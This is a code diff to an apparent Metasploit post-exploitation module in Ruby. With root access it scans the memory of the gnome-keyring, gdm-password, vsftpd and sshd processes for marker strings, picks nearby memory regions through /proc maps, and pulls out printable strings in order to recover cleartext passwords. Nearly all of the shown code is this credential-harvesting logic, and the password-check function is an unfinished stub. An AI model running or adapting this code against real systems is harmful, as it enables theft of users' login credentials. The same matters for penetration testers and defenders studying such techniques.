@@ -95,6 +95,53 @@ class MetasploitModule < Msf::Post
     mem_search_ascii(target_pid, 5, 500, target_info['needles'])
   end
 
+  # Selects memory regions to read based on locations
+  # of matches
+  def choose_mem_regions(match_data = [])
+    return [] if match_data.empty?
+
+    mem_regions = []
+    match_data.each do |match|
+      next unless match.key?('sect_start') && match.key?('sect_len')
+
+      start = match.fetch('sect_start')
+      len = match.fetch('sect_len')
+      mem_regions << { 'start' => start, 'length' => len }
+    end
+
+    mem_regions.uniq!
+    pid = match_data.first['pid']
+    mem_data = read_file("/proc/#{pid}/maps")
+    return mem_regions if mem_data.nil?
+
+    lines = mem_data.split("\n")
+    updated_regions = mem_regions.clone
+    mem_regions.each do |region|
+      address = region['start']
+      addr_line = lines.select { |line| line.include?(address.to_s(16)) }
+      next if addr_line.empty?
+
+      addr_line = addr_line.first
+
+      index = lines.index(addr_line)
+      next if index.nil?
+      next if lines[index + 1].nil?
+
+      # Password may be in next memory region if
+      # match is found near end of previous region
+      addr_line = lines[index + 1]
+      addresses = addr_line.split&.first
+      start_addr, end_addr = addresses.split('-')
+      start_addr = start_addr.to_i(16)
+      end_addr = end_addr.to_i(16)
+
+      length = (end_addr - start_addr) / 2
+      updated_regions << { 'start' => start_addr, 'length' => length }
+    end
+
+    updated_regions
+  end
+
   def get_printable_strings(pid, start_addr, section_len)
     lines = []
     curr_addr = start_addr
@@ -103,19 +150,21 @@ class MetasploitModule < Msf::Post
     while curr_addr < max_addr
       data = mem_read(pid, curr_addr, 1000)
       if data.gsub("\x00", '').empty?
-        curr_addr += 500
+        curr_addr += 800
         next
       end
 
       lines << data.split("\x00")
       lines = lines.flatten
-      curr_addr += 500
+      curr_addr += 800
     end
 
     lines.each { |line| line.gsub!(/[^[:print:]]/, '') }
     lines.reject! { |line| line.length < 5 }
     lines
   end
+
+  def check_for_password(captured_strings, passwords); end
 
   def run
     fail_with(Failure::BadConfig, 'Root privileges are required') unless is_root?
@@ -128,36 +177,49 @@ class MetasploitModule < Msf::Post
         'needles' => [
           '^+libgck\\-1.so\\.0$',
           'libgcrypt\\.so\\..+$'
-        ]
+        ],
+        'pid' => nil
+      },
+      {
+        'name' => 'gdm-password',
+        'needles' => [
+          '^_pammodutil_getpwnam_root_1$',
+          '^gkr_system_authtok$'
+        ],
+        'pid' => nil
+      },
+      {
+        'name' => 'vsftpd',
+        'needles' => [
+          '^::.+\\:[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}$'
+        ],
+        'pid' => nil
+      },
+      {
+        'name' => 'sshd:',
+        'needles' => [
+          '^sudo.+'
+        ],
+        'pid' => nil
       }
     ]
 
-    matches = []
+    # matches = []
+    captured_strings = []
     target_proc_info.each do |info|
       print_status("Checking matches for process #{info['name']}")
-      match = get_matches(info)
-      match.first['pid'] = info['pid']
+      match_set = get_matches(info)
+      next if match_set.empty?
 
-      matches << match
+      match_set.each { |match| match.store('pid', info['pid']) }
+      search_regions = choose_mem_regions(match_set)
+      next if search_regions.empty?
+
+      search_regions.each { |reg| captured_strings << get_printable_strings(info['pid'], reg['start'], reg['length']) }
+
+      captured_strings.flatten!
+      captured_strings.uniq!
+      # matches << match_set
     end
-
-    if matches.empty?
-      fail_with(Failure::UnexpectedReply, 'No matches were found')
-    end
-
-    matches = matches.flatten
-    pid = matches.first['pid']
-
-    captured_strings = []
-    matches.each do |match|
-      start_addr = match['match_offset'] - 4096
-      start_addr = match['sect_start'] if start_addr < match['sect_start']
-      print_status("Starting search at address #{start_addr}")
-      # for each match, search the section of memory for all 'printable' strings
-      captured_strings << get_printable_strings(pid, match['match_offset'], match['sect_len'])
-    end
-
-    captured_strings.flatten!
-    captured_strings.uniq!
   end
 end
